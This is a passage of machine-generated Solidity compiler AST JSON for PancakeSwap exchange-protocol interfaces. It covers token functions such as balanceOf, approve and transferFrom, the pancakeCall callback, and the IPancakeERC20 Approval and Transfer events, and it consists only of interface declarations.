									"parameters": {
										"id": 1724,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "321:2:2"
									},
									"returnParameters": {
										"id": 1727,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1726,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1728,
												"src": "347:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1725,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "347:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "346:15:2"
									},
									"scope": 1784,
									"src": "306:56:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1733,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1729,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "385:2:2"
									},
									"returnParameters": {
										"id": 1732,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1731,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1733,
												"src": "411:5:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1730,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "411:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "410:7:2"
									},
									"scope": 1784,
									"src": "368:50:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1738,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1734,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "444:2:2"
									},
									"returnParameters": {
										"id": 1737,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1736,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1738,
												"src": "470:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1735,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "470:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "469:9:2"
									},
									"scope": 1784,
									"src": "424:55:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1745,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1741,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1740,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1745,
												"src": "504:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1739,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "504:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "503:15:2"
									},
									"returnParameters": {
										"id": 1744,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1743,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1745,
												"src": "542:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1742,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "542:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "541:9:2"
									},
									"scope": 1784,
									"src": "485:66:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1754,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1750,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1747,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1754,
												"src": "576:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1746,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "576:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1749,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1754,
												"src": "591:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1748,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "591:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "575:32:2"
									},
									"returnParameters": {
										"id": 1753,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1752,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1754,
												"src": "631:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1751,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "631:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "630:9:2"
									},
									"scope": 1784,
									"src": "557:83:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1763,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1759,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1756,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1763,
												"src": "663:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1755,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "663:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1758,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1763,
												"src": "680:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1757,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "680:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "662:32:2"
									},
									"returnParameters": {
										"id": 1762,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1761,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1763,
												"src": "713:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1760,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "713:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "712:6:2"
									},
									"scope": 1784,
									"src": "646:73:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1772,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1768,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1765,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1772,
												"src": "743:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1764,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "743:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1767,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1772,
												"src": "755:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1766,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "755:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "742:27:2"
									},
									"returnParameters": {
										"id": 1771,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1770,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1772,
												"src": "788:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1769,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "788:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "787:6:2"
									},
									"scope": 1784,
									"src": "725:69:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1783,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1779,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1774,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 1783,
												"src": "831:12:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1773,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "831:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1776,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1783,
												"src": "853:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1775,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "853:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1778,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1783,
												"src": "873:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1777,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "873:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "821:71:2"
									},
									"returnParameters": {
										"id": 1782,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1781,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1783,
												"src": "911:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1780,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "911:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "910:6:2"
									},
									"scope": 1784,
									"src": "800:117:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 1785,
							"src": "62:857:2"
						}
					],
					"src": "36:884:2"
				},
				"id": 2
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol",
					"exportedSymbols": {
						"IPancakeCallee": [
							1798
						]
					},
					"id": 1799,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1786,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:3"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1798,
							"linearizedBaseContracts": [
								1798
							],
							"name": "IPancakeCallee",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"id": 1797,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "pancakeCall",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1795,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1788,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1797,
												"src": "123:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1787,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "123:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1790,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1797,
												"src": "147:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1789,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "147:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1792,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1797,
												"src": "172:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1791,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "172:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1794,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 1797,
												"src": "197:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1793,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "197:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "113:109:3"
									},
									"returnParameters": {
										"id": 1796,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "231:0:3"
									},
									"scope": 1798,
									"src": "93:139:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 1799,
							"src": "62:172:3"
						}
					],
					"src": "36:199:3"
				},
				"id": 3
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol",
					"exportedSymbols": {
						"IPancakeERC20": [
							1916
						]
					},
					"id": 1917,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1800,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:4"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1916,
							"linearizedBaseContracts": [
								1916
							],
							"name": "IPancakeERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 1808,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1807,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1802,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1808,
												"src": "116:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1801,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "116:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1804,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1808,
												"src": "147:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1803,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "147:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1806,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1808,
												"src": "180:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1805,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "180:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "106:93:4"
									},
									"src": "92:108:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1816,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1815,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1810,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 1816,
												"src": "220:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1809,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "220:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1812,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1816,
												"src": "242:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1811,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "242:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1814,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1816,
												"src": "262:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1813,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "262:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "219:57:4"
									},
									"src": "205:72:4"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1821,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1817,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "296:2:4"
									},
									"returnParameters": {
										"id": 1820,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1819,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1821,
												"src": "322:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1818,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "322:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "321:15:4"
									},
									"scope": 1916,
									"src": "283:54:4",
									"stateMutability": "pure",
									"superFunction": 2007,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1826,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1822,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "358:2:4"
									},
									"returnParameters": {
										"id": 1825,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1824,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1826,
												"src": "384:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1823,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "384:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "383:15:4"
									},
									"scope": 1916,
									"src": "343:56:4",
									"stateMutability": "pure",
									"superFunction": 2012,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1831,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1827,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "422:2:4"
									},
									"returnParameters": {
										"id": 1830,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1829,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1831,
												"src": "448:5:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1828,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "448:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "447:7:4"
									},
									"scope": 1916,
									"src": "405:50:4",
									"stateMutability": "pure",
									"superFunction": 2017,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1836,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1832,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "481:2:4"
									},
									"returnParameters": {
										"id": 1835,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1834,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1836,
												"src": "507:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1833,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "507:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "506:9:4"
									},
									"scope": 1916,
									"src": "461:55:4",
									"stateMutability": "view",
									"superFunction": 2022,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1843,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1839,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1838,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1843,
												"src": "541:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1837,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "541:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "540:15:4"
									},
									"returnParameters": {
										"id": 1842,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1841,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1843,
												"src": "579:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1840,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "579:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "578:9:4"
									},
									"scope": 1916,
									"src": "522:66:4",
									"stateMutability": "view",
									"superFunction": 2029,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1852,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1848,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1845,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1852,
												"src": "622:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1844,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "622:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1847,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1852,
												"src": "645:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1846,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "645:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "612:54:4"
									},
									"returnParameters": {
										"id": 1851,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1850,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1852,
												"src": "690:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1849,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "690:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "689:9:4"
									},
									"scope": 1916,
									"src": "594:105:4",
									"stateMutability": "view",
									"superFunction": 2038,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1861,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1857,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1854,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1861,
